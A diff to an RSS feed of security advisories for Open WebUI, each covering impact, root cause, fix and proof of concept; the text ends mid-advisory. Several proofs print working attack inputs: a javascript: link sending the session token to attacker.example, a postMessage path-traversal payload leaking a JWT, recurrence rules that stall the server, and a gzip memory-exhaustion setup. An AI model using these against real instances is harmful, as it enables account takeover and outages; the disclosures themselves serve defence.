@@ -7,7 +7,920 @@
     <atom:link href="https://stephen-cox.github.io/vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Sun, 27 Sep 2026 09:47:48 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 28 Sep 2026 10:29:38 +0000</lastBuildDate>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Other users' session tokens disclosed via OAuth-mode connections, tool servers and terminals</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-gqfh-jxvw-74rp</link>
+      <description>CVSS 4.2 (CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:N/A:N) · CWE-200
+
+Affected:
+- pip/open-webui &gt;= 0.6.27, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Other users' session tokens disclosed via OAuth-mode connections, tool servers and terminals&#13;
+&#13;
+## Summary&#13;
+An OpenAI-compatible connection, OpenAPI tool server or terminal server configured with the "OAuth" authentication mode sent the full browser cookie jar of the requesting user to its destination, including Open WebUI's own session cookie. The mode is documented to the administrator as forwarding only the user's OAuth access token. Every user whose request reached such a connection disclosed a live session credential to the destination, whether or not they were the administrator who configured it and whether or not an OAuth token was present.&#13;
+&#13;
+## Preconditions&#13;
+An administrator has configured at least one OpenAI-compatible connection, OpenAPI tool server or terminal server with the "OAuth" authentication mode. Connections default to bearer authentication, so this mode is never active out of the box. No OAuth provider needs to be configured or return a token; the cookies were sent regardless. The destination only needs to observe the incoming Cookie header, which ordinary request logging does. Not affected: connections using the "Session" authentication mode, whose forwarding of session credentials is documented, and MCP tool servers, which never received cookies.&#13;
+&#13;
+## Impact&#13;
+The operator of the destination receives the Open WebUI session cookie of every verified user whose request reaches it, including through routine calls such as the model list fetched on page load, with no action from the user beyond ordinary use. Replaying that cookie against the instance authenticates as that user for the lifetime of the token, which gives the destination full access to the account and administrative access where the user is an administrator. The destination is a server an administrator registered for OAuth authentication, a configuration that implied sending it only the OAuth access token.&#13;
+&#13;
+## Fix&#13;
+Fixed in 0.11.4 by https://github.com/open-webui/open-webui/commit/f9f815c86220f809fad5ee1300c44f55dea74c79 (OpenAI-compatible connections), https://github.com/open-webui/open-webui/commit/b71744b17823f7a3a9a64cb363e79a7164ed5b23 (terminal servers) and https://github.com/open-webui/open-webui/commit/3cda47cdb449aac970426f0929c9e5f8bb8bd807 (tool servers and terminal tools). Forwarding the cookie jar is now a separate per-connection setting that is off by default, so the OAuth mode sends only the OAuth access token in the Authorization header. Upgrading resolves the issue with no configuration change.&#13;
+&#13;
+## Root cause&#13;
+Affected component: the outbound header and cookie builder for OpenAI-compatible connections, the builder for OpenAPI tool servers and terminal tools, and the terminal server proxy.&#13;
+Affected setup: any deployment with a connection, tool server or terminal server set to the "OAuth" authentication mode.&#13;
+&#13;
+When the OAuth mode was added, its branch copied the cookie line from the neighbouring "Session" branch unchanged, so the whole inbound cookie jar was attached to the outbound request before, and independently of, the OAuth token lookup. The forwarded cookies were never narrowed to what the mode is documented to send. Because each outbound call carries the requesting user's own cookies, the disclosed session belongs to whichever user triggered the call.&#13;
+&#13;
+## Proof of concept&#13;
+Reproduced by the reporter against a running 0.11.2 instance. An OpenAI-compatible connection was registered with a request-capturing destination and the "OAuth" authentication mode. A model list request authenticated only by the session cookie triggered the outbound call. The destination received the full cookie jar, including the session cookie, and no OAuth token. Replaying the captured cookie against the instance returned an authenticated response as the affected account.&#13;
+&#13;
+Confirmed during triage by running the connection header builder from 0.11.3 and 0.11.4 with the same session cookies and no OAuth token: 0.11.3 attaches the session cookie to the outbound request, and 0.11.4 attaches no cookies.&#13;
+&#13;
+## Credits&#13;
+@gigioneggiando&#13;
+@brodmart</description>
+      <guid isPermaLink="false">GHSA-gqfh-jxvw-74rp</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:55:15 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Instance-wide stall via automation recurrence rules that evade sub-daily frequency detection</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-whgc-vpjx-m3qh</link>
+      <description>CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-400, CWE-436
+
+Affected:
+- pip/open-webui &gt;= 0.11.0, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Instance-wide stall via automation recurrence rules that evade sub-daily frequency detection&#13;
+&#13;
+## Summary&#13;
+Any account permitted to create automations can submit a recurrence rule that Open WebUI classifies as harmless while the underlying calendar library reads it as a per-second schedule. Validating such a rule walks every occurrence between the rule's start date and now, synchronously on the shared event loop, so a single request leaves the deployment unable to answer anyone for minutes. Once stored, the scheduler repeats that work on every poll. The 0.11.0 release added a guard against exactly this cost, but the guard decides what a rule is by re-reading the submitted text, and several spellings the calendar library accepts never reach it.&#13;
+&#13;
+## Preconditions&#13;
+An account permitted to create or update automations. `USER_PERMISSIONS_FEATURES_AUTOMATIONS` defaults to `False`, so out of the box only an administrator qualifies; it becomes reachable by ordinary users on any deployment that has granted the automations feature, which is the normal way to make the shipped feature usable. `UVICORN_WORKERS` defaults to `1`, so there is no second worker to absorb the stall. Nothing else is required: no knowledge of other users, ids or tokens, and no unusual syntax. Deployments that have not granted the automations permission to non-administrators are reachable only by administrators.&#13;
+&#13;
+## Impact&#13;
+Availability, against every other user of the instance and against the operator. Measured on a real instance running 0.11.0, one create request cost 191.59 seconds of blocked event loop, during which 37 of 48 health checks issued by a second client timed out. The request is cheap to issue and can be repeated or pipelined, and because the rule is accepted and stored, the scheduler re-enters the same parsing on each poll, so the instance does not recover on its own. There is no confidentiality or integrity impact, and no data is disclosed or modified.&#13;
+&#13;
+## Fix&#13;
+Fixed in https://github.com/open-webui/open-webui/pull/29262 and the accompanying recurrence refactor, both released in 0.11.4. The parser takes the frequency, interval and rule count from the rule the calendar library actually built and splits the rule text on any whitespace the same way the library does, so every accepted spelling is classified and bounded alike. Every schedule evaluation also now runs outside the event loop under a two second budget, so no rule can stall the instance. Upgrading fully resolves the issue; no configuration change is required.&#13;
+&#13;
+## Root cause&#13;
+Affected component: the recurrence-rule parser and validator in `backend/open_webui/utils/automations.py`. Reached from the automation create, update and toggle handlers in `backend/open_webui/routers/automations.py`, from the built-in automation tools, and from the scheduler's claim path in `backend/open_webui/models/automations.py`. Affected setup: 0.11.0 is affected by every spelling below; 0.11.1 to 0.11.3 are affected by the whitespace-folded spellings only.&#13;
+&#13;
+The 0.11.0 fix bounds the work by recognising sub-second, per-minute and hourly rules and re-anchoring them near the present. It recognises them by parsing the submitted rule text a second time, by hand, and comparing the result against a fixed set of names. That second parse is stricter than the calendar library's: it matches the frequency name case-sensitively where the library is case-insensitive, it looks for rules on their own lines where the library splits on any whitespace, and it requires a rule keyword prefix the library treats as optional. A rule that any of those disagreements hides is accepted as ordinary and then walked from its stated start date, which is the unbounded behaviour the guard exists to prevent. The guard was present, but it inspected a different reading of the input than the one that was executed.&#13;
+&#13;
+## Proof of concept&#13;
+Against a real instance running 0.11.0, as an account permitted to create automations. Nothing was seeded directly; each rule was submitted through the normal create endpoint.&#13;
+&#13;
+Lower-case frequency value:&#13;
+&#13;
+```&#13;
+DTSTART:20000101T000000&#13;
+RRULE:FREQ=secondly;INTERVAL=1&#13;
+```&#13;
+&#13;
+Ordinary upper-case frequency with no rule keyword prefix, which the guard misses just as completely:&#13;
+&#13;
+```&#13;
+DTSTART:20000101T000000&#13;
+FREQ=SECONDLY;INTERVAL=1&#13;
+```&#13;
+&#13;
+Folding the same two lines onto one line separated by a space, or by a tab, has the same effect, as does joining two rule lines by whitespace, which additionally slips past the check that only one recurrence rule was submitted.&#13;
+&#13;
+Submitting the first rule returned HTTP 200 after 191.59 seconds. A second client polling an unauthenticated health endpoint throughout recorded 37 timeouts across 48 attempts. Submitting the second rule returned HTTP 200 after 154.72 seconds. For comparison, the same rules spelled in the form the guard recognises are validated in under a millisecond.&#13;
+&#13;
+## Credits&#13;
+@baeseungwon1010 reported the case-varied frequency value, and demonstrated that a rule differing from a benign one only in letter case reaches the unbounded path.&#13;
+&#13;
+@Classic298 identified the remaining spellings that reach the same path with an ordinary upper-case frequency: a rule submitted without the recurrence keyword prefix, the same rule folded onto a single line by whitespace, and two recurrence rules joined by whitespace, which also defeats the single-rule check.</description>
+      <guid isPermaLink="false">GHSA-whgc-vpjx-m3qh</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:53:56 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Viewer session token theft via javascript: URLs in chat message links</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-wf9m-46cp-c6h6</link>
+      <description>CVSS 6.4 (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N) · CWE-79
+
+Affected:
+- pip/open-webui &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Viewer session token theft via javascript: URLs in chat message links&#13;
+&#13;
+## Summary&#13;
+Any authenticated user could place a markdown link with a `javascript:` URL in content that another user later views, such as a shared chat. The link was rendered as a clickable anchor with the URL unchanged, because the markdown renderer never checked the link's scheme. When the victim clicked it in an affected browser, the script ran inside Open WebUI in the victim's session and could read their session token.&#13;
+&#13;
+## Preconditions&#13;
+- The attacker has any regular account with the chat sharing permission (`chat.share`, on by default).&#13;
+- The victim can open the attacker's shared chat: they were granted access to the share, or they are an admin (admins can open any shared chat by default, `ENABLE_ADMIN_CHAT_ACCESS=true`). Channel messages render through the same component when channels are enabled (`ENABLE_CHANNELS`, off by default).&#13;
+- The victim clicks the link. A plain click triggers it in Safari and every other WebKit browser (which includes every browser on iOS). In Firefox it takes a middle click or a Ctrl/Shift click. Chromium-based browsers do not run it.&#13;
+- No Content-Security-Policy header is set, which is the default.&#13;
+&#13;
+## Impact&#13;
+The attacker's script runs in the Open WebUI origin as the victim. It reads the victim's JWT from local storage and sends it to the attacker, who can then use the API with the victim's full permissions. If the victim is an admin, that means the whole instance. The attacker needs the victim to open the shared chat and click the link in an affected browser (see Preconditions). Victims on Chromium-based browsers are not affected, and neither is any deployment that sets a CSP forbidding inline script.&#13;
+&#13;
+## Fix&#13;
+Fixed in [#29890](https://github.com/open-webui/open-webui/pull/29890). Before a markdown link is rendered, its URL is now checked, and only http, https, mailto, tel and relative URLs are kept. A link with any other scheme is shown as plain text. Upgrading is enough.&#13;
+&#13;
+## Root cause&#13;
+- Component: the chat markdown link renderer (`src/lib/components/chat/Messages/Markdown/MarkdownInlineTokens.svelte`), and in older releases the `marked.parse` rendering in the response message view.&#13;
+- Affected setup: every release before 0.11.4.&#13;
+&#13;
+Link URLs from the markdown lexer went straight into the anchor's `href`. `marked` does not filter URL schemes, and link tokens skipped DOMPurify (only raw HTML tokens were sanitised), so nothing along the way rejected `javascript:` URLs.&#13;
+&#13;
+## Proof of concept&#13;
+Reproduced against the official v0.11.3 image with the default configuration, and checked against v0.11.4.&#13;
+1. As the admin, create two regular users, attacker and victim.&#13;
+2. As the attacker, create a chat (`POST /api/v1/chats/new`) whose assistant message contains:&#13;
+   `[Free GPU credits](jAvascript:fetch('https://attacker.example/leak?t='+localStorage.token))`&#13;
+3. Share it (`POST /api/v1/chats/{id}/share`) and give the victim read access (`POST /api/v1/chats/shared/{id}/access/update`).&#13;
+4. As the victim, open `/s/{share_id}` in WebKit and click "Free GPU credits". The listener receives the victim's JWT, sent from the Open WebUI origin. The same happens in Firefox with a middle click or Ctrl+click.&#13;
+5. On v0.11.4 the link renders without an `href`, and clicking it does nothing.&#13;
+&#13;
+## Credits&#13;
+- @r20z19, reporter</description>
+      <guid isPermaLink="false">GHSA-wf9m-46cp-c6h6</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:51:36 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Any authenticated user can exhaust server memory via a compressed remote image in a chat message</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-w8j8-jv6j-3m47</link>
+      <description>CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-400, CWE-409
+
+Affected:
+- pip/open-webui &gt;= 0.6.42, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Any authenticated user can exhaust server memory via a compressed remote image in a chat message&#13;
+&#13;
+## Summary&#13;
+An ordinary account can put any URL in the image field of a chat message. The server fetches that URL and inlines the bytes into the request it sends on to the model provider. The fetch had no ceiling on how much it would read, and HTTP content encoding lets the sender decide how much the receiver materialises, so a few hundred kilobytes crossing the network turn into hundreds of megabytes held in the server process. Nothing on that path limited the size, the compression ratio, or how often it could be repeated.&#13;
+&#13;
+## Preconditions&#13;
+- Default configuration. Nothing needs to be enabled and no setting needs to be weakened.&#13;
+- Any verified account with access to a model. No elevated role and no workspace permission.&#13;
+- A host the attacker controls, reachable from the server, returning a compressed response. The URL has to resolve to a public address: the private-address filter is untouched and still blocks internal targets.&#13;
+- Every build from 0.6.42 through 0.11.3 carries the affected code.&#13;
+&#13;
+## Impact&#13;
+Availability, against every other user of the instance. Measured against a real instance: a single request from an ordinary account, with about 261 KB leaving the attacker's host, drove the server process from 731 MB to 2.16 GB resident and returned HTTP 200. That figure is a setting rather than a ceiling, because the size is chosen by the attacker's host and the request can be repeated. There is no confidentiality or integrity effect, and no data is read or altered.&#13;
+&#13;
+## Fix&#13;
+Fixed in 0.11.4 by #29623. The image fetch now reads the response incrementally, asks for an unencoded body, and refuses any response that still arrives compressed, so the sender can no longer pick the decoded size. An image that arrives compressed is not inlined and the message is sent on without it. Upgrading is sufficient, there is nothing an operator has to configure.&#13;
+&#13;
+## Root cause&#13;
+- `backend/open_webui/utils/files.py`, `get_image_base64_from_url`: read the whole response body into memory before encoding it.&#13;
+- `backend/open_webui/utils/middleware.py`, `convert_url_images_to_base64`: the caller, which runs on every chat request and holds each encoded image for the life of that request.&#13;
+&#13;
+The helper was written to fetch a small image and treats a response as something that arrives whole. The announced length was never the constraint that mattered, because content encoding decides how much the receiver has to materialise. The HTTP client library decompresses transparently, so a small compressed body expands to an attacker-chosen decoded size in the server process before any size check applies. The same unbounded read is present in both implementations of the helper, the one using the synchronous HTTP client before 0.9.0 and the asynchronous one after it.&#13;
+&#13;
+## Proof of concept&#13;
+Against a real instance, as an account with the default user role:&#13;
+&#13;
+1. Host a server that returns a gzip-encoded response and writes the compressed bytes in small pieces rather than all at once.&#13;
+2. As the ordinary account, send a chat message containing an image item whose URL points at that server.&#13;
+3. The request returns 200.&#13;
+&#13;
+Measured on that run: 260,934 bytes left the attacker's host, the server decoded 268,435,456 bytes, and the process grew from 730,980,352 to 2,163,429,376 bytes resident over 2.6 seconds.&#13;
+&#13;
+## Credits&#13;
+@y4rvin, for the finding.</description>
+      <guid isPermaLink="false">GHSA-w8j8-jv6j-3m47</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:49:07 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] open-webui/open-webui — Any website can steal a signed-in user's session token via the community stats message handler</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-vpq8-f445-hcq7</link>
+      <description>CVSS 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) · CWE-346
+
+Affected:
+- pip/open-webui &gt;= 0.7.0, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Any website can steal a signed-in user's session token via the community stats message handler&#13;
+&#13;
+## Summary&#13;
+The sync stats modal registered a `window` message listener that processed `verify:chat` messages from any web origin without checking `event.origin`, and replied to `window.opener` with target origin `*`. The chat id from the message was inserted into an authenticated request URL without encoding. Any external website that a signed-in user visits can therefore make that user's browser fetch a chosen authenticated endpoint and hand the response, including the user's session token, back to the attacker. No attacker account and no administrator action are required.&#13;
+&#13;
+## Preconditions&#13;
+- Community sharing enabled (`ENABLE_COMMUNITY_SHARING`, default `True`), which is what mounts the sync stats modal and its message listener.&#13;
+- The victim is signed in to Open WebUI in the same browser and visits an attacker-controlled page that opens Open WebUI in a popup. Deployments with community sharing disabled are not affected.&#13;
+&#13;
+## Impact&#13;
+The attacker page posts a `verify:chat` message carrying a path-traversal chat id such as `../../../auths/`. The listener passes it unencoded into `GET /api/v1/chats/stats/export/&lt;id&gt;`, which the browser normalises to `GET /api/v1/auths/` and sends with the victim's bearer token. The listener then posts the response back to the opener with target origin `*`, so the attacker origin receives the victim's identity and raw JWT. That token replays from any client with only an `Authorization` header, granting full API access as the victim: private chats and any authenticated action under the victim's role. The demonstrated victim held the ordinary `user` role.&#13;
+&#13;
+## Fix&#13;
+Fixed in v0.11.4 by PR #29918. The listener now ignores any message whose `event.origin` is not one of the known community origins, replies only to that validated origin instead of `*`, and the chat id is passed through `encodeURIComponent` so it can no longer escape its URL path segment. Upgrading to 0.11.4 fully resolves the issue with no further configuration.&#13;
+&#13;
+## Root cause&#13;
+`src/lib/components/chat/Settings/SyncStatsModal.svelte` held a `verify:chat` message handler, and `exportSingleChatStats` in `src/lib/apis/chats/index.ts` built the request URL. The handler is mounted on every page whenever community sharing is enabled, so the listener was active even while the modal was hidden. The origin allowlist that already guarded the other community message handlers was absent here, and the chat id was concatenated into the path without encoding, so an attacker-chosen value could both be accepted from an untrusted origin and redirect the authenticated request to a different endpoint.&#13;
+&#13;
+## Proof of concept&#13;
+Reproduced against the vulnerable and fixed code in a two-origin browser harness. From an attacker origin, opening the target and repeatedly posting `{ type: 'verify:chat', data: { id: '../../../auths/' } }` caused the target to issue `GET /api/v1/auths/` carrying the victim's bearer token and to post the response back to the attacker origin, which then received the victim's email and JWT. Against the fixed code the message is rejected on the origin check and no request is made.&#13;
+&#13;
+## Credits&#13;
+@zyakir13</description>
+      <guid isPermaLink="false">GHSA-vpq8-f445-hcq7</guid>
+      <category>HIGH</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:47:06 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] open-webui/open-webui — Viewer session token theft via a script link in a shared chat's citation</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-qpqv-xwg8-cqpj</link>
+      <description>CVSS 7.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N) · CWE-79
+
+Affected:
+- pip/open-webui &gt;= 0.6.33, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Viewer session token theft via a script link in a shared chat's citation&#13;
+&#13;
+## Summary&#13;
+Any authenticated user can store a `javascript:` URL in the `embed_url` field of a chat citation and share that chat with another user. When the second user opens the shared chat and clicks the citation, the URL is passed straight to `window.open`, executing attacker script in the Open WebUI origin. The frontend never checks the URL scheme before opening it, so the attacker's script runs with the victim's session and can read `localStorage.token` and act as the victim.&#13;
+&#13;
+## Preconditions&#13;
+Default configuration, fresh database, no special settings. The attacker is any authenticated user who can create and share a chat (no admin rights, no `workspace.*` permission). The victim is any user who opens the shared read-only chat (`/s/{share_id}`), expands the sources, and clicks the malicious citation. The `embed_url` value is set by editing the attacker's own chat through the normal chat update API, which stores the attacker-controlled citation structure.&#13;
+&#13;
+## Impact&#13;
+Script executes in the application origin as the victim, so the attacker can exfiltrate `localStorage.token` (the JWT used for every API call) and then act with the victim's permissions, including reading the victim's private chats. Exploitation requires the victim to click the citation in the shared chat. If the victim is an administrator, the account compromise extends to admin capabilities. Only the citation-embed click path is affected; citations whose `embed_url` is a normal http/https link are unaffected.&#13;
+&#13;
+## Fix&#13;
+Fixed in 0.11.4 by PR #29701. The citation click handler now requires the `embed_url` to be an `http`/`https` URL (or protocol-relative) before it is opened or handed to the embed panel; any other value, including a `javascript:` URL, falls back to the citation modal, which renders the source safely. Upgrading to 0.11.4 fully resolves the issue with no further configuration.&#13;
+&#13;
+## Root cause&#13;
+`src/lib/components/chat/Messages/Citations.svelte` (`showSourceModal`) read `citations[index].source.embed_url` and, when the chat is read-only, called `window.open(embedUrl, '_blank')` directly. The value comes from the stored chat, which a user fully controls through the chat update API, and no URL-scheme validation stood between the stored value and the sink. The read-only `window.open` branch shipped from 0.6.33 onward, so every build from 0.6.33 through 0.11.3 carried the code.&#13;
+&#13;
+## Proof of concept&#13;
+The reporter reproduced with two normal accounts on a default 0.11.3 instance: the attacker stored a citation with `embed_url` set to a `javascript:` payload that fetched `localStorage.token` to a listener, shared the chat with the victim, and on the victim clicking the citation the token was exfiltrated and then used to read a private victim chat that the attacker account could not access directly. Independently confirmed in Chromium that `window.open` with a `javascript:` URL and a `_blank` target runs in the opening page's origin and can read and send its `localStorage.token`. On 0.11.4 the guard rejects `javascript:` and `data:` values and admits only http, https and protocol-relative URLs to that path.&#13;
+&#13;
+## Credits&#13;
+Reported by @zyakir13. Fix by @Classic298.</description>
+      <guid isPermaLink="false">GHSA-qpqv-xwg8-cqpj</guid>
+      <category>HIGH</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:45:25 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Directory structure of inaccessible knowledge bases disclosed via an unscoped directory id</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-jx3w-3pqq-7f3w</link>
+      <description>CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-639, CWE-863
+
+Affected:
+- pip/open-webui &gt;= 0.9.6, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Directory structure of inaccessible knowledge bases disclosed via an unscoped directory id&#13;
+&#13;
+## Summary&#13;
+A user who can read one knowledge base could list it with the id of a directory that belongs to a different knowledge base they have no access to. The response returned that directory and every parent above it, including folder names and the owning user. The same foreign directory id was also accepted as the parent of a new or moved directory and as the target directory when linking files. None of these paths checked that the directory belonged to the knowledge base named in the request.&#13;
+&#13;
+## Preconditions&#13;
+- An account with read access to at least one knowledge base, through a share grant, the `workspace.knowledge` permission (off by default) or the admin role.&#13;
+- The id of a directory inside a knowledge base the attacker cannot access. Directory ids are random UUIDs and cannot be enumerated, so in practice this is someone who saw them earlier, for example a collaborator whose access was later revoked.&#13;
+- No configuration flag is involved. Every deployment running an affected version with knowledge base directories carries the code path.&#13;
+&#13;
+## Impact&#13;
+With one retained directory id, the attacker reads the current name, id, parent, owner user id, containing knowledge base id and timestamps of that directory and all of its ancestors. Renames made after their access was revoked are also visible. Where folder names encode client, project or case names, that structure is the sensitive part. The id requirement keeps the realistic attacker population small. The write-side paths let the attacker attach their own directories or files under a foreign directory, but this gives them nothing beyond the write access they already hold on their own knowledge base. File contents, file lists and the embeddings of the foreign knowledge base are not exposed.&#13;
+&#13;
+## Fix&#13;
+Fixed in a9541c18c. Directory lookups are now bound to the knowledge base in the request: the breadcrumb walk only follows directories of that knowledge base, and every endpoint that accepts a directory or parent id rejects one from another knowledge base. The upload path ignores it. Upgrading is sufficient.&#13;
+&#13;
+## Root cause&#13;
+- `backend/open_webui/models/knowledge.py`, `get_directory_breadcrumbs`&#13;
+- `backend/open_webui/routers/knowledge.py`, `GET /api/v1/knowledge/{id}/files` (`directory_id`), `POST /{id}/dirs/create` and `POST /{id}/dirs/{dir_id}/update` (`parent_id`), `POST /{id}/file/add` and `POST /{id}/files/batch/add` (`directory_id`)&#13;
+- `backend/open_webui/routers/files.py`, upload auto-link (`metadata.directory_id`)&#13;
+- Present in every release from 0.9.6, when knowledge base directories were introduced.&#13;
+&#13;
+Each endpoint checked the caller's access to the knowledge base in the URL and then used the caller-supplied directory id as given. The breadcrumb walk looked directories up by id alone, while the file list and directory list in the same response were filtered by knowledge base. So the one part of the response that followed the caller's id could leave the authorised knowledge base. The create, update and link paths had the same gap, and only the move, delete and sync cleanup paths compared the directory's knowledge base to the one in the URL.&#13;
+&#13;
+## Proof of concept&#13;
+Reproduced against the real knowledge router on a fresh database. The admin owns a private knowledge base A with the nested directories `ACME-Litigation/witness-list` and a knowledge base B shared with an ordinary user.&#13;
+&#13;
+1. As the user, `GET /api/v1/knowledge/{A}/files` returns 400 (no access).&#13;
+2. As the user, `GET /api/v1/knowledge/{B}/files?directory_id={id of witness-list}` returns 200 with `breadcrumbs` listing `ACME-Litigation` and `witness-list`, each carrying knowledge base A's id and the admin's user id.&#13;
+3. As the user, `POST /api/v1/knowledge/{B}/dirs/create` with `parent_id` set to a directory of A returns 200 and stores the foreign parent. The same happens for `POST /api/v1/knowledge/{B}/dirs/{dir}/update`.&#13;
+&#13;
+On the fixed version, step 2 returns an empty `breadcrumbs` list and step 3 returns 404. Directories of B still produce breadcrumbs and can still be used as parents.&#13;
+&#13;
+## Credits&#13;
+- 0xMax-Sec (reporter)</description>
+      <guid isPermaLink="false">GHSA-jx3w-3pqq-7f3w</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:34:53 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Any authenticated user can reach disabled model provider backends via an explicit backend index</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-hm62-64q2-6gxw</link>
+      <description>CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-639, CWE-862
+
+Affected:
+- pip/open-webui &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Any authenticated user can reach disabled model provider backends via an explicit backend index&#13;
+&#13;
+## Summary&#13;
+&#13;
+Several Ollama and OpenAI-compatible model listing routes accept a caller-supplied backend index and use it to select a connection directly from the administrator-configured provider list. No check is performed on whether the caller is permitted to reach that connection. Any account with the `user` role can therefore make the server issue requests to a provider backend it was never granted, including one the administrator has explicitly disabled, and can read back that backend's version string. Two of the affected routes send the request with the connection's configured API key attached.&#13;
+&#13;
+## Preconditions&#13;
+&#13;
+- More than one model provider connection configured, either Ollama backends or OpenAI-compatible connections. A deployment with a single connection loses nothing here, because the caller can only select a connection that is already the one in use.&#13;
+- An account with the `user` role. `DEFAULT_USER_ROLE` defaults to `pending`, so an administrator must have approved the account or the deployment must be configured to grant `user` on signup. Administrator privileges are not required, and the affected behaviour is intended for administrators.&#13;
+- No other knowledge is required. The index is a small integer and valid values can be found by trial.&#13;
+- `BYPASS_MODEL_ACCESS_CONTROL` defaults to `false`. With the default, the catalogue returned by the affected routes is filtered by per-model access control, so no model names are disclosed. With the flag set to `true`, the catalogues of enabled connections are already visible to every account through the routes that take no index, but a disabled connection's catalogue is only reachable through the index, and so is sending inference to it.&#13;
+&#13;
+## Impact&#13;
+&#13;
+A non-administrator can direct the server to contact a provider backend outside the set it is entitled to use. This covers backends the administrator has switched off, which the equivalent routes that take no index correctly skip, and backends that serve only models the account has no access to. On two of the affected routes the outbound request carries that connection's configured API key, so the backend accepts it as an authorised call. The key itself is never returned to the caller.&#13;
+&#13;
+The version string of any configured backend, including a disabled one, is returned to the caller verbatim. The routes that return a model catalogue disclose nothing under default configuration, because the upstream response is filtered by per-model access control before it is returned. An out-of-range index previously produced a different response from a valid one, which revealed how many connections are configured.&#13;
+&#13;
+With `BYPASS_MODEL_ACCESS_CONTROL` enabled, the same missing check applied to the inference routes, so a non-administrator could send generation and embedding requests to a disabled backend and consume its capacity, rather than only listing it.&#13;
+&#13;
+Nothing is written or deleted on any backend, no credential is disclosed to the caller, and no other account's data is exposed. The reachable destinations are limited to the connections the administrator configured, so no request can be steered to an address of the caller's choosing.&#13;
+&#13;
+## Fix&#13;
+&#13;
+Fixed in [#29619](https://github.com/open-webui/open-webui/pull/29619), completing an earlier change that shipped in 0.11.1. Selecting a provider connection by explicit index now requires an administrator on the affected listing routes, whether the index is given as a path segment or as a query parameter, matching the model management routes alongside them. The per-model backend check on the inference routes is no longer skipped when per-model access control is bypassed. The 0.11.1 change gated only the path form, so 0.11.1 to 0.11.3 remained reachable through the query parameter. Upgrading to 0.11.4 fully resolves the issue with no configuration change.&#13;
+&#13;
+## Root cause&#13;
+&#13;
+The affected surface is the Ollama tag listing, version and OpenAI-format model listing routes, and the OpenAI-compatible model listing route. Each is available to any verified account and accepts the backend index both as a trailing path segment and as a query parameter on the form that takes no index. Every released version before 0.11.4 carries the code.&#13;
+&#13;
+An earlier fix introduced a check that a caller-supplied index must point at a backend actually serving the requested model, and applied it to the routes that run inference. The listing routes were not covered, because they name no model and therefore had nothing for that check to compare against. The question they needed answering was different, namely whether the caller may address a specific connection at all, and no control existed for it. The same earlier check also stepped aside entirely when per-model access control was bypassed. That left the inference routes open in that configuration for the one case per-model access control does not describe: an administrator having disabled the backend.&#13;
+&#13;
+## Proof of concept&#13;
+&#13;
+Two provider connections were configured through the administrator API, with index 1 marked disabled and holding a distinct API key. The backends were local HTTP servers standing in for real providers, recording every request they received along with its `Authorization` header. A second account was created with the `user` role.&#13;
+&#13;
+As that account, requesting the tag listing, version and model listing routes with index 1, in both the path and query forms, returned HTTP 200. The disabled backend recorded each request, and the tag listing and OpenAI-compatible model listing arrived carrying the administrator's configured key for that connection. The version route returned the disabled backend's version string to the caller verbatim. An index beyond the end of the list produced a server error where a valid index produced a success, giving the number of configured connections.&#13;
+&#13;
+With `BYPASS_MODEL_ACCESS_CONTROL` set to `true`, the same account sent a chat completion to index 1 and the disabled backend served it.&#13;
+&#13;
